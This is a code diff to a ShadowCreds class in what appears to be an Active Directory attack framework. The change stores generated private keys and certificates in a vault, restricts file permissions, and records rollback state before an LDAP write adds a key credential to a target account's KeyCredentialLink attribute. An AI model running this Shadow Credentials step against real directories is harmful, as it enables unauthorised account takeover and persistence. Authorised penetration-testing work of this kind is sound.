@@ -191,13 +191,50 @@ class ShadowCreds:
         dn = str(conn.entries[0].distinguishedName)
         try:
             material = generate_shadow_material(sam, dn)
-            key_path = session.path(f"shadow-{sam}.key.pem")
-            cert_path = session.path(f"shadow-{sam}.cert.pem")
-            key_path.write_bytes(material["private_key_pem"])
-            cert_path.write_bytes(material["cert_pem"])
+            from adaf_attack.core.paths import atomic_write_bytes, restrict_permissions
+            from adaf_attack.core.vault import VaultError
+
             dn_bin_path = session.path(f"shadow-{sam}.dnbinary.txt")
             dn_bin_path.write_text(material["dn_binary"] + "\n", encoding="utf-8")
+            restrict_permissions(dn_bin_path, 0o600)
+            key_ref = f"shadow-{sam}-key"
+            cert_ref = f"shadow-{sam}-cert"
+            try:
+                vault = session.vault()
+                vault.put(
+                    key_ref,
+                    kind="private-key",
+                    value=material["private_key_pem"].decode("ascii", errors="ignore"),
+                    secret=True,
+                    metadata={"sam": sam},
+                )
+                vault.put(
+                    cert_ref,
+                    kind="certificate",
+                    value=material["cert_pem"].decode("ascii", errors="ignore"),
+                    secret=True,
+                    metadata={"sam": sam},
+                )
+                key_path = session.root / "vault" / key_ref
+                cert_path = session.root / "vault" / cert_ref
+            except (VaultError, OSError, UnicodeError):
+                key_path = session.path(f"shadow-{sam}.key.pem")
+                cert_path = session.path(f"shadow-{sam}.cert.pem")
+                atomic_write_bytes(key_path, material["private_key_pem"])
+                atomic_write_bytes(cert_path, material["cert_pem"])
+                restrict_permissions(key_path, 0o600)
+                restrict_permissions(cert_path, 0o600)
 
+            record_pre_state(
+                session,
+                kind="shadow-creds",
+                target=dn,
+                artifact=dn_bin_path,
+                extra={
+                    "rollback": "Remove the exact KeyCredentialLink DN-Binary value.",
+                    "sam": sam,
+                },
+            )
             ok = conn.modify(dn, {ATTR: [(MODIFY_ADD, [material["dn_binary"]])]})
             result = {
                 "sam": sam,
@@ -211,16 +248,6 @@ class ShadowCreds:
                 "blob_len": material["blob_len"],
             }
             if ok:
-                record_pre_state(
-                    session,
-                    kind="shadow-creds",
-                    target=dn,
-                    artifact=dn_bin_path,
-                    extra={
-                        "rollback": "Remove the exact KeyCredentialLink DN-Binary value.",
-                        "sam": sam,
-                    },
-                )
                 console.print(f"  [green]LDAP ADD ok[/green]  {ATTR} on {dn}")
                 console.print(f"  key → {key_path}")
                 console.print(f"  cert → {cert_path}")
